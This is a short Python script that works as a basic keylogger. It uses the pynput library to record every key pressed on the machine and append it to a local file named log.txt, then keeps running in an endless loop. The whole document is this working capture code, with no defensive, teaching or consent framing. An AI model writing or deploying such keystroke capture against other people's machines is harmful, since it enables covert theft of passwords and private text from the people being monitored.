```python
from pynput import keyboard

# Initialize the log file
with open("log.txt", "w") as f:
    pass

# Define a function to write keys to the log file
def log_key(key):
    try:
        with open("log.txt", "a") as f:
            f.write(str(key.char))
    except:
        with open("log.txt", "a") as f:
            f.write(str(key))

# Create a listener to listen for keyboard events
listener = keyboard.Listener(on_press=log_key)

# Start the listener
listener.start()

# Keep the program running
while True:
    pass
```